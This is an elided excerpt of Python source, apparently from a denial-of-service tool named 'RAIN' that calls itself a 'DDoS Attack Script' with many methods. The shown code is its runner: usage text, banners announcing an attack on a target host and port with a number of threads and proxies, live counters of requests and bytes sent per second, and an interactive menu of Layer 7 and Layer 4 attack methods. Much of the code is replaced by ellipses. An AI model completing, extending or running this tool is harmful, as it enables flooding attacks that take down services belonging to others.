...
try:
    from ddos_art import (interactive_main, show_attack_start,
                          render_status, show_attack_end)
    from ddos_art import init as _art_init
    _art_init()
except Exception:
    interactive_main = None
    show_attack_start = None
    render_status = None
    show_attack_end = None
...
class ToolsConsole:
    ...
    def usage():
        print((
                  '* RAIN - DDoS Attack Script With %d Methods\n'
...
if __name__ == '__main__':
    with suppress(KeyboardInterrupt):
        try:
            ...
            if show_attack_start is not None:
                if method in Methods.LAYER7_METHODS:
                    show_attack_start(method, url.host, host,
                                      url.port or 80, threads, timer,
                                      True, (len(proxies) if proxies else 0))
                else:
                    show_attack_start(method, target, target,
                                      port or 80, threads, timer,
                                      False, 0)
                ...
                if logger.level <= 10:
                    logger.debug(
                        ...
                        (target or url.host,
                         ...
                         method,
                         Tools.humanformat(_rps),
                         Tools.humanbytes(_bps),
                         round((time() - ts) / timer * 100, 2)))
                elif render_status is not None:
                    render_status(int(time() - ts), timer, method,
                                  str(target or url.host),
                                  _rps, _bps, threads,
                                  int(time() - ts), timer)
                REQUESTS_SENT.set(0)
                BYTES_SEND.set(0)
            ...
            event.clear()
            if show_attack_end is not None:
                print()
                show_attack_end(_tot_req, _tot_bytes)
            exit()

        except IndexError:
            if interactive_main is not None:
                interactive_main(list(Methods.LAYER7_METHODS),
                                 list(Methods.LAYER4_METHODS),
